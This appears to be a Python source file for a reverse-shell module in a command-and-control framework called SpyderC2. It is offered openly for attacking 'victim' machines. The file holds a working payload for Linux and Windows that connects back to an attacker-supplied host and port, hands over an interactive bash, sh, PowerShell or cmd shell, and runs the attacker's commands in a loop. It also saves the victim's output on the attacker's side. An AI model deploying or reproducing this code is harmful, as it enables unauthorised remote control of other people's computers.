import sys
import os
import pdb
import pathlib
import time
import base64
from termcolor import colored
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Reverseshell(Module):
	description = f"This module starts a reverse shell from the victim shell. NOTE : Use a listener tool like netcat to start a listener in another shell before running this module. Ex : nc -nlvp <lport> , ncat -nlvp <lport>','cyan')"

	@classmethod
	def module_options(cls):
		h = {
			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>. NOTE : The default path can be accessed in both docker and host, accessibility of custom path will depend on where you run the program.', 'required' : False},
			'lhost' : {'desc':'The IP address of the listening host. This is where the victim will try to connect, mostly the server IP.','required': True},
			'lport' : {'desc':'The port of the listening host. This is where the victim will try to connect, mostly the server port.','required': True}
		}
		return h

	def __init__(self,name,utility,language,options):

		## We are loading the script in the script variable here
		super(Reverseshell, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    

	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
	def handle_task_output(self,data,options,victim_id, task_id):
		## Comes as a bytes object, so changing to string
		output = data.decode('utf-8')

		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		filename = f"reverseshell_{task_id}.txt"
		filepath = os.path.join(dump_path,filename)

		if 'path' in  options:
			if not os.path.exists(options['path']):
				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {filepath}")
			else:
				filepath = os.path.join(options['path'],filename)


		## Check if we have write perms else save to /tmp/SpyderC2
		if not os.access(os.path.dirname(filepath), os.W_OK):
			dump_path = os.path.join('/tmp','SpyderC2',victim_id)
			print(f"No write access to {os.path.dirname(filepath)}. Saving to {dump_path}")
			if not os.path.exists(dump_path):
				os.makedirs(dump_path,exist_ok=True)
			filepath = os.path.join(dump_path,filename)

		f = open(filepath,'w+')
		print(output,file=f)

		output = filepath
		return output

	def script_python(self,options):
		script = """def execute_command():
		import platform
		platform_name = platform.system()
		if platform_name == 'Linux':
			from os import dup2
			from os.path import exists
			from subprocess import run
			import socket
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(("##lhost##",##lport##)) 
			dup2(s.fileno(),0) 
			dup2(s.fileno(),1) 
			dup2(s.fileno(),2) 
			if exists('/bin/bash'):
				run(["/bin/bash","-i"])
			elif exists('/bin/sh'):
				run(["/bin/sh","-i"])
			## Maybe Android ?
			elif exists('/system/bin/bash'):
				run(["/system/bin/bash","-i"])
			elif exists('/system/bin/sh'):
				run(["/system/bin/sh","-i"])
		elif platform_name == 'Windows':
			## Taken from https://github.com/TacticalCheerio/Python-Windows-Reverse-Shell with a few modifications
			import os
			import socket
			import subprocess
			HOST = '##lhost##'
			PORT = ##lport##

			try:
				subprocess.check_output(["powershell", "-Command", 'ls'],shell=True,stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
				powershell = True
			except:
				powershell = False

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((HOST, PORT))
			s.send(str.encode("[*] Connection Established! "))
			if powershell:
				s.send(str.encode("Using Powershell\\n"))
			else:
				s.send(str.encode("Using Command Prompt\\n"))
			while True:
				try:
					s.send(str.encode(os.getcwd() + "> "))
					data = s.recv(1024).decode("UTF-8")
					data = data.strip()
					if data == "quit" or data == "exit": 
						break
					if data[:2] == "cd":
						os.chdir(data[3:])
					if len(data) > 0:
						if powershell:
							proc = subprocess.Popen(["powershell", "-Command", data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						else:
							proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
						stdout_value = proc.stdout.read() + proc.stderr.read()
						output_str = str(stdout_value, "UTF-8")
						s.send(str.encode(output_str))
				except Exception as e:
					continue
				
			s.close()"""

		## TODO - make this through a loop for all params
		## TODO - this should be required parameter
		if 'lhost' in options:
			lhost = options['lhost']

		if 'lport' in options:
			lport = options['lport']

		script = script.replace('##lhost##',lhost)
		script = script.replace('##lport##',lport)
		return script


	def script_powershell(self,options):
		script = """"""

		return script


					
				
